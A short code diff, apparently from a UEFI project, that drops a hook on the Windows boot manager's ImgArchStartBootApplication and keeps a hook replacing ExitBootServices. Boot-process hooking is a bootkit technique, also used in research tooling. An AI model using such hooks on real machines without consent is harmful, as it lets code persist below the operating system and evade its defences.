@@ -59,14 +59,7 @@ EFI_STATUS efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
         // bootmgfw.efiの情報を表示
         PrintLoadedImageInfo(&BootmgrHandle);
 
-        //bootmgfw.efi!ImgArchStartBootApplicationをフック
-        Status = SetupImgArchStartBootApplication(BootmgrHandle);
-        if (EFI_ERROR(Status))
-        {
-            Print(L"[-] Failed to hook to Windows EFI bootmgr(Status=%d)\r\n", Status);
-        }
-        Print(L"[+] Hooked the bootmgfw.efi!ImgArchStartBootApplication\r\n");
-
+        // ExitBootServicesをフック
         OriginalExitBootServices = SetServicePointer((VOID*)&gBS->ExitBootServices, &HookedExitBootServices, TRUE);
         Print(L"[+] Original ExitBootServices is 0x%llx\n", OriginalExitBootServices);
 
